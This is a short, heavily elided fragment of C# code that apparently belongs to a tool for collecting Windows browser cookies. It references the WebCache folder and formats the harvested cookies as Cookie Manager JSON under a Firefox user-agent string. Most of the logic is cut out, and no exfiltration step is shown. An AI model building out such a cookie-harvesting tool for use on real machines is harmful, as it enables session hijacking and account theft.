...
";
        ...
        static void Main(string[] args)
        {
            ...
            //paths[0] = localAppData + "\\Microsoft\\Windows\\WebCache\\";
            ...
            try
            {
                if (getCookies)
                {
                    ...
                    else
                    {
                        ...
                        totalResults = "{"+System.Environment.NewLine+
                            "\"cookieManagerVersion\": \"1.6\"," + System.Environment.NewLine +
 "\"userAgent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0\"," + System.Environment.NewLine +
 "\"cookies\": [" + totalResults + "]} ";
